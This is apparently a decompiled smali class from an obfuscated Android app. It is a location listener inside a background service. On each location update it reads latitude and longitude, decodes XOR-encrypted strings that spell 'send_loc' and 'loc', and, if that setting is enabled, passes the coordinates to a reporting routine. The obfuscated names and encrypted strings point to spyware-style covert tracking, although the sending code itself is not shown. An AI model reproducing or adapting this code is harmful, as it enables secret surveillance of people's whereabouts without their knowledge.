.class Lcom/vknnolqo/p9sv5zvf/O3t1U4u4$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Landroid/location/LocationListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/vknnolqo/p9sv5zvf/O3t1U4u4;->onStartCommand(Landroid/content/Intent;II)I
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Lcom/vknnolqo/p9sv5zvf/O3t1U4u4;


# direct methods
.method constructor <init>(Lcom/vknnolqo/p9sv5zvf/O3t1U4u4;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/O3t1U4u4$a;->b:Lcom/vknnolqo/p9sv5zvf/O3t1U4u4;

    iput-object p2, p0, Lcom/vknnolqo/p9sv5zvf/O3t1U4u4$a;->a:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onLocationChanged(Landroid/location/Location;)V
    .locals 6

    invoke-virtual {p1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v2

    invoke-virtual {p1}, Landroid/location/Location;->getLongitude()D

    move-result-wide v4

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/O3t1U4u4$a;->b:Lcom/vknnolqo/p9sv5zvf/O3t1U4u4;

    iget-object v1, p0, Lcom/vknnolqo/p9sv5zvf/O3t1U4u4$a;->a:Landroid/content/Context;

    invoke-static/range {v0 .. v5}, Lcom/vknnolqo/p9sv5zvf/O3t1U4u4;->a(Lcom/vknnolqo/p9sv5zvf/O3t1U4u4;Landroid/content/Context;DD)Ljava/lang/String;

    move-result-object p1

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->b()Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/O3t1U4u4$a;->a:Landroid/content/Context;

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    new-array v3, v1, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0, v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/O3t1U4u4$a;->a:Landroid/content/Context;

    const/4 v2, 0x3

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    invoke-static {v2, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, p1, v1}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->k(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    :cond_0
    sget-object p1, Lcom/vknnolqo/p9sv5zvf/O3t1U4u4;->c:Landroid/location/LocationManager;

    if-eqz p1, :cond_1

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/O3t1U4u4;->b:Landroid/location/LocationListener;

    invoke-virtual {p1, v0}, Landroid/location/LocationManager;->removeUpdates(Landroid/location/LocationListener;)V

    :cond_1
    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/O3t1U4u4$a;->b:Lcom/vknnolqo/p9sv5zvf/O3t1U4u4;

    const/4 v0, 0x0

    invoke-virtual {p1, v0}, Landroid/app/Service;->stopForeground(Z)V

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/O3t1U4u4$a;->b:Lcom/vknnolqo/p9sv5zvf/O3t1U4u4;

    invoke-virtual {p1}, Landroid/app/Service;->stopSelf()V

    :goto_0
    return-void

    :array_0
    .array-data 1
        0x35t
        0x53t
        0x24t
        0x54t
        0x3at
        0x0t
        0x32t
        -0x6ct
    .end array-data

    :array_1
    .array-data 1
        0x46t
        0x36t
        0x4at
        0x30t
        0x65t
        0x6ct
        0x5dt
        -0x9t
    .end array-data

    :array_2
    .array-data 1
        0x55t
        -0x76t
        0xdt
    .end array-data

    :array_3
    .array-data 1
        0x39t
        -0x1bt
        0x6et
        0x2t
        0x71t
        -0x4dt
        0x33t
        -0x3t
    .end array-data
.end method
